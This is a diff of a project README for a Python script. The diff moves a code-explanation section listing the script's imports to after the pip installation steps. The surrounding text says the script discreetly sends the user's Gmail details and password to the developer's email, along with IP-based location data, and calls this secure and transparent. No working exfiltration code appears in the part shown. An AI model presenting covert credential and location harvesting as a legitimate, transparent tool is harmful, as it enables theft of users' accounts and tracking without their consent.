@@ -10,21 +10,6 @@ Subsequently, the script discreetly sends the user's Gmail details, password, re
 
 Finally, the script leverages an external service to obtain the user's IP-related details, such as city, region, country, and timezone. This information is also sent securely to the developer's email. The user receives a confirmation message upon successful email transmission, ensuring transparency about the process's completion.
 
-This is the break down of code and explaination each part:
-
-Part 1: Importing Libraries
-
-```python
-import json
-from urllib.request import urlopen
-import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-import platform
-import socket
-import psutil
-```
-
 Installation
 
 Follow these steps to set up the Python environment and install the required dependencies for this project:
@@ -58,6 +43,20 @@ Use pip to install the necessary dependencies specified in the requirements.txt 
 pip install -r requirements.txt
 ```
 
+This is the break down of code and explaination each part:
+
+Part 1: Importing Libraries
+
+```python
+import json
+from urllib.request import urlopen
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+import platform
+import socket
+import psutil
+```
 
 Part 2: User Input
 
